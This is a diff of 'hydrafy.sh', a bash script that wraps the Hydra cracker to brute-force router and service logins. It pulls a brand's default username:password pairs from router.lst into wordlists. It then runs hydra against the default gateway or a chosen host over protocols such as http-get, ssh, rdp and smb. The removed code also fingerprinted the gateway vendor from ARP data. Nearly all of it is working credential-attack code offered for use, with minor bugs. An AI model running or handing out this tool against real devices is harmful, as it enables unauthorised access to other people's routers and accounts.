@@ -1,5 +1,5 @@
 #!/bin/bash
-function script_info--()
+script_info--()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: hydrafy.sh
@@ -49,11 +49,12 @@ function script_info--()
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Creation of a function that will save username and passwords to seperate files if desired
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+## Configure a protocol check function to prevent improper syntax
+## Figure out which protocols require the -U option for usage.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -81,28 +82,22 @@ function script_info--()
 ## rm oui-name oui oui.txt
 
 
-## After some serious thought and deliberation, I decided to make this a 3 choice script
-## Display the user/pass combos, Save the user/pass combos, or just save and run hydra
-
-
-## Support for the Router Attack method is limited to browser-based http-get requests right now.
-## If other methods of attack are wanted, shoot me some ideas on implementation and I'll give you credit where due.
-
-
-## Version 7.2 of hydra can be obtained via: wget http://www.thc.org/releases/hydra-7.2-src.tar.gz
-
-
 ## There is now an option for -C -or- -L and -P with reference to methodology of attack
 
 
 ## router.lst has been parsed for duplicate values and I have removed as many of them as I could find.
 
 
-## On 24 March 2012, Snakebite mode was been implemented via the -s flag during launch.
-## I had intended this to be an automated form of attack via the venom that snakebite mode spits out, however the list from the IEEE is "skewed" at best with reference to the OUI company.  If I could ever get my hands on a nice list that somewhat resembles the names listed in router.lst, I will certainly script up some venom for an automated attack.
+## On 5 April 2012, rtr_check--() was implemented.  Hopefully this will help to grow router.lst.
 
 
-## On 5 April 2012, rtr_check--() was implemented.  Hopefully this will help to grow router.lst. 
+## As of 25 September 2012, the option for multiple protocol attacks were implemented.
+## HydraFy has finally been ported over for usage on the N900!
+## install_hydrafy_n900.sh file movements/creations:  ## For those who are curious what the file does, as it deletes itself...
+	## /opt/usr/share/pixmaps/hydrafy_icon.png
+	## /usr/bin/hydrafy.sh
+	## /usr/share/applications/hildon/hydrafy.desktop
+	## /home/user/MyDocs/pwnphone/hydrafy
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
@@ -119,39 +114,30 @@ function script_info--()
 
 ## TAPE for making me look deper into regex and pointing out the 360+ duplicate usernames and passwords within router.lst
 
-## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.
+## Deviney for some of the ideas in atk_mth--(), the ideas behind protocol--() and list_protocol--()
+
+## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 sleep 0
 }
-
 ##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
-envir--()
-{
-WRN="\033[31m"   ## Warnings / Infinite Loops
-INS="\033[1;32m" ## Instructions
-OUT="\033[1;33m" ## Outputs
-HDR="\033[1;34m" ## Headers
-INP="\033[36m"   ## Inputs
-}
-
-function usage--()
+usage--()
 {
 clear
-echo -e "$HDR\nHydrafy {Aka HydraFu}
+echo -e "$HDR\n****************HydraFy*****************
 Author: Snafu ----> will@configitnow.com
 Version $OUT$current_ver$HDR (\033[1;33m$rel_date$HDR)$INS
+
 Read Comments Prior to Usage"
-echo -e "$INS\nUsage:
-./hydrafy -s {\033[1;33mDisplay Router OUI Information$INS}
-
--or-
-
-./hydrafy$INS -r$HDR <brand of router to parse for>\n"
+echo -e "$HDR\nUsage:$INS\n
+./hydrafy$HDR
+****************************************\n"
+read
 }
 
 rtr_check--()
 {
-grep -i $rtr router.lst
+grep -i $rtr router.lst > /dev/null
 if [[ $? -ne 0 ]];then
 	clear
 	echo -e "$OUT\n$rtr is not listed in router.lst.
@@ -161,33 +147,116 @@ If $OUT$rtr$INS was not a misspell, please contribute to the hydrafy project
   (i.e.$OUT Usernames, Passwords, Spelling Variations, OUI Listings, etc$INS) to:$OUT\n
    will@configitnow.com
   $INS Subj Line:$OUT hydra\n"
+	read
 	exit 0
 else
-	parser--
+	main_menu--
 fi
+}
+
+protocol--()
+{
+
+	list_protocol--()
+	{
+	clear
+	echo -e "$OUT\ncisco || cisco-enable || cvs || firebird || ftp || ftps
+http[s]-{head|get} || http[s]-{get|post}-form || http-proxy || http-proxy-urlenum
+icq || imap[s] || irc || ldap2[s] || ldap3[-{cram|digest}md5][s] || mssql mysql
+ncp || nntp || oracle-listener || oracle-sid || pcanywhere || pcnfs || pop3[s]
+postgres || rdp || rexec || rlogin || rsh || sip || smb || smtp[s] || smtp-enum
+snmp || socks5 || ssh || svn || teamspeak || telnet[s] || vmauthd || vnc || xmpp\n$INS
+Press Enter to Return"
+	read
+	protocol--
+	}
+
+echo -e "$INP\nWhat protcol will you be using? [Enter $INS'list'$INP to see the protcols available)]"
+read prt
+if [[ $prt == "list" ]];then
+	list_protocol--
+fi
+}
+##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+
+
+##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+declare--()
+{
+clear
+echo -e "$INP\nWhat is the Brand of Router?\n"
+read rtr
+if [[ -z $rtr ]];then
+	echo -e "$WRN You Must Declare the Brand to Continue"
+	read
+	exit 1
+else
+	rtr_check--
+fi
+}
+
+main_menu--()
+{
+clear
+echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-------------------------------
+           HydraFy
+-------------------------------
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
+1) Search/Save User-Pass Combos
+
+2) Attack User-Pass Combos
+
+R)edeclare Router Brand
+
+E)xit HydraFy
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+read var
+case $var in
+	1) parent="1"
+	parser--;;
+
+	2) parent="2"
+	parser--;;
+
+	r|R) declare--;;
+
+	e|E) exit 0;;
+
+	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
+	sleep 1
+	main_menu--;;
+esac
 }
 
 parser--()
 {
 #p_value= ## Parsing style
 clear
-echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
--------------------------------------------------------
-                     Parser Style
--------------------------------------------------------
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
-1) Anywhere$INS                 [grep -i <brand of router>]$INP
+echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+---------------------------------------------
+              Parser Instructions
+---------------------------------------------
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
+1) Anywhere$INS     [grep -i <brand of router>]$INP
 
-2) Starts with$INS             [grep -i ^<brand of router>]$INP
+2) Starts with$INS  [grep -i ^<brand of router>]$INP
 
-3) Word match$INS             [grep -iwx <brand of router>]$INP
+3) Word match$INS   [grep -iwx <brand of router>]$INP
 
-E)xit Script\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+P)revious Menu
+
+E)xit HydraFy\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 read p_value
 case $p_value in
-	1|2|3) menu--;;
-	
+	1|2|3) case $parent in
+		1) parse_menu--;;
+		2) user_pass--;;
+	esac;;
+
+	p|P) main_menu--;;
+
 	e|E) exit 0;; 
 	
 	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
@@ -195,55 +264,33 @@ case $p_value in
 	parser--;;
 esac
 }
-##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
-
-##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-snakebite--()
-{
-bite=$(route -en | grep UG | awk '{print $2}')
-if [[ -z $bite ]];then
-	clear
-	echo -e "$WRN\n\nYou Are Not Connected to a Network that has a Router\n\n"
-	sleep 2
-	exit 1
-else
-	ping -c 1 -s 1 $bite > /dev/null
-	bite=$(arp -n $bite | grep $bite | awk '{print $3}' | cut -c1-8)
-	bite=$(grep $bite oui.lst | awk -F\| '{print $1}')
-	clear
-	echo -e "$OUT\n\n$bite$HDR is the most likely candidate for the router\n\n"
-	sleep 2
-	exit 0
-fi
-}
-
-function menu--()
+parse_menu--()
 {
 #selection= ## Menu Choice
 clear
-echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
--------------------------------------------------------
-                   Hydrafy Choices
--------------------------------------------------------
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
+echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-------------------------------------------
+              Parser Choices
+-------------------------------------------
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
 1) Display Usernames:Passwords
 
 2) Save Usernames:Passwords to a file
 
-3) Implement Router Attack via Hydra
+3) Save Usernames and Passwords seperately
 
 P)revious Menu
 
-E)xit Script$HDR
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+E)xit HydraFy$HDR
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 read selection
 case $selection in
 	1) display--;;
 
-	2) file_save--;;
+	2) file_save-- single;;
 
-	3) hydrafy--;;
+	3) file_save-- dual;;
 
 	p|P) parser--;;
 
@@ -251,11 +298,11 @@ case $selection in
 
 	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
 	sleep 1
-	menu--;;
+	parse_menu--;;
 esac
 }
 
-function display--()
+display--()
 {
 clear
 echo -e "$HDR\n--------------------------------------------------------$OUT"
@@ -270,52 +317,80 @@ esac
 echo -e "$HDR--------------------------------------------------------$INS
 
 The usernames/passwords above were derived from this wordsearch:$OUT $rtr\n"
+read
+exit 0
 }
 
-function file_save--()
+file_save--()
 {
-#SAVE= ## Filename to save output to
-clear
-while [ -z $save ];do
-	echo -e "$INP\nFile Name?"
-	read save
-done
+if [[ -n combo.lst ]];then
+	mv combo.lst combo.old > /dev/null 2>&1
+fi
 
-case $p_value in
-	1) grep -i $rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;
+if [[ -n user.lst ]];then
+	mv user.lst user.old > /dev/null 2>&1
+fi
 
-	2) grep -i ^$rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;
+if [[ -n pass.lst ]];then
+	mv pass.lst pass.old > /dev/null 2>&1
+fi
 
-	3) grep -iwx $rtr router.lst | awk -F\| '{print $2":"$3}' > $save;;
+case $1 in
+	single)
+	case $p_value in
+		1) grep -i $rtr router.lst | awk -F\| '{print $2":"$3}' > combo.lst;;
+
+		2) grep -i ^$rtr router.lst | awk -F\| '{print $2":"$3}' > combo.lst;;
+
+		3) grep -iwx $rtr router.lst | awk -F\| '{print $2":"$3}' > combo.lst;;
+	esac
+
+	clear
+	echo -e "$INS\nFile Written to: \033[1;33mcombo.lst\033[1;32m
+
+The usernames/passwords were derived from this wordsearch:$OUT $rtr\n\n\n"
+	read
+	exit 0;;
+
+	dual)
+	case $p_value in
+		1) grep -i $rtr router.lst | awk -F\| '{print $2}' > user.lst
+		grep -i $rtr router.lst | awk -F\| '{print $3}' > pass.lst;;
+
+		2) grep -i ^$rtr router.lst | awk -F\| '{print $2}' > user.lst
+		grep -i ^$rtr router.lst | awk -F\| '{print $3}' > pass.lst;;
+
+		3) grep -iwx $rtr router.lst | awk -F\| '{print $2}' > user.lst
+		grep -iwx $rtr router.lst | awk -F\| '{print $3}' > pass.lst;;
+	esac
+
+	clear
+	echo -e "$INS\nFiles Written to: \033[1;33muser.lst$INS and$OUT pass.lst$INS
+
+The usernames/passwords were derived from this wordsearch:$OUT $rtr\n\n\n"
+	read
+	exit 0;;
 esac
-
-echo -e "\033[1;32m
-File Written to:\033[1;33m $save\033[1;32m
-
-The usernames/passwords above were derived from this wordsearch:\033[1;33m $rtr
-"
 }
 
-function hydrafy--()
+user_pass--()
 {
 style= ## Method of attack
-ip= ## Tgt address for hydra
-at= ## path for past root
 while [ -z $style ];do
 	clear
-	echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
--------------------------------------------------------------------------------------------
-                               Username/Password Attack Style
--------------------------------------------------------------------------------------------
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
-1) -C (recommended)$INS    [colon separated "login:pass" format]$WRN (Recommended)$INP
+	echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+----------------------------------------------------
+               Username/Password Usage
+----------------------------------------------------
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
+1) -C (recommended)$INS   ["login:pass" format]$INP
 
-2) -L and -P$INS          [load logins and passwords from router.lst]$INP
+2) -L and -P$INS          [Username and Password format]$INP
 
 P)revious Menu
 
-E)xit Script$HDR
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+E)xit HydraFy$HDR
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	read style
 	case $style in
 		1) case $p_value in
@@ -337,7 +412,7 @@ E)xit Script$HDR
 			grep -iwx $rtr router.lst | awk -F\| '{print $3}' | sort | uniq > pass.txt;;
 		esac;;
 
-		p|P) menu--;;
+		p|P) parser--;;
 
 		e|E) exit 0;;
 
@@ -347,75 +422,140 @@ E)xit Script$HDR
 	esac
 
 done
+var= ## Nulled
+atk_mth--
+}
 
-clear
-echo -e "$INS\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$HDR
-########Example URL#########$INS
+atk_mth--()
+{
+ip=$(route -en | grep UG | awk '{print $2}') ## Set to default for 1st Gateway
+pth="/" ## Path past root
+prt="http-get" ## Protocol
+tsk="1" ## Parallel Tasking
+to="5" ## Timeout limitations
+var_I= ## Nulled
+while [ -z $var ];do
+	clear
+	echo -e "$HDR########Example URL#########$INS
 http://example.com/index.asp
 -or-
 http://192.168.1.1/index.asp$HDR
 ############################$INS
 
-index.asp will describe the \"path past root\"$INS\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
-while [ -z $ip ];do
-	echo -e "$INP\nTgt IP/Hostname? ----->$INS {http:// is prepended by default}$INP <-----"
-	read ip
-done
+index.asp describes the \"path past root\"$HDR
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
+1) Tgt IP/Hostname   [$OUT$ip$INP]
 
-while [ -z $var ];do
-	echo -e "$INP\nDoes the URL extend past root? <y or n>"
-	read var
-	case $var in
-		y|Y) extend="yes" ;;
-		n|N) extend="no" ;;
-		*) var= ;; ## Nulled
+2) Path Past Root    [$OUT$pth$INP]
+
+3) Protocol          [$OUT$prt$INP]
+
+4) Parallel Tasks    [$OUT$tsk$INP]
+
+5) Timeout Limit     [$OUT$to$INP]
+
+C)ommence Attack
+
+P)revious Menu
+
+E)xit HydraFy$HDR
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+	read selection
+
+	case $selection in
+		1) echo -e "$INP\nTgt IP/Domain?"
+		read ip;;
+
+		2) while [ -z $var_I ];do
+			echo -e "$INP\nDoes the URL extend past root? <y or n>"
+			read var_I
+			case $var_I in
+				y|Y) extend="yes" ;;
+				
+				n|N) extend="no"
+				pth="/" ;;
+
+				*) var_I= ;; ## Nulled
+			esac
+
+		done
+
+		case $extend in
+			yes) pth="/"
+			pth_1= ## Nulled
+			while [ -z $pth_1 ];do
+				echo -e "$INP\nWhat is the path past root? $WRN{The / is pre-pended by default}"
+				read pth_1
+			done
+
+			pth=$pth$pth_1 ;;
+		esac;;
+
+		3) clear 
+		protocol--;;
+
+		4) echo -e "$INP\nParallel Tasks? $WRN{1-128}"
+		read to
+		if [[ $tsk -lt 1 || $tsk -gt 128 ]];then
+			tsk=
+		fi;;
+
+		5) echo -e "$INP\nTimeout limitation?"
+		read to ;;
+
+		c|C) if [[ -z $ip || -z $pth || -z $prt || -z $tsk || -z $to ]];then
+			echo -e "$WRN\nAll Fields Must be Filled Before Proceeding"
+			sleep 1
+		else
+			var=complete
+		fi;;
+
+		p|P) user_pass--;;
+
+		e|E) exit 0;;
 	esac
 
 done
 
-case $extend in
-	yes) while [ -z $at ];do
-		echo -e "$INP\nWhat is the path past root?"
-		read at
-	done
-
-	case $style in
-		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
-		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
-	esac;;
-
-
-	no)
-	case $style in
-		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
-		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
-	esac;;
-
+clear
+case $style in
+	1) hydra $ip -C snakebite.txt -t $tsk -w $to -V -f $prt $pth ;;
+	2) hydra $ip -L user.txt -P pass.txt -t $tsk -w $to -V -f $prt $pth ;;
 esac
+
+read
+reset
+exit 0
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ END Main Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-current_ver="1.4"
-rel_date="6 April 2012"
+envir--()
+{
+WRN="\033[31m"   ## Warnings / Infinite Loops
+INS="\033[1;32m" ## Instructions
+OUT="\033[1;33m" ## Outputs
+HDR="\033[1;34m" ## Headers
+INP="\033[36m"   ## Inputs
+}
+
+current_ver="1.5"
+rel_date="3 October 2012"
 envir--
-while getopts ":r:s" options; do
-  case $options in
-    r) rtr=$OPTARG;;
 
-	s) snakebite--;;
+### Interesting results via osso-xterm here....  Will play with later, just want to publish for now.
+# which hydra
+# if [[ $? -ne 0 ]];then
+# 	echo -e "$WRN\nYOU MUST HAVE HYDRA IN YOUR PATH FOR HYDRAFY TO WORK"
+# 	read
+# 	reset
+# 	exit 1
+# fi
 
-	:) clear
-	echo -e "$WRN\nOption -$OPTARG requires an argument."
-	exit 1;;
-  esac
-
-done
-
-if [[ -n "$rtr" ]]; then
-	rtr_check--
-else
+if [[ -n $1 ]]; then
 	usage--
+else
+	declare--
 fi
 # ##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
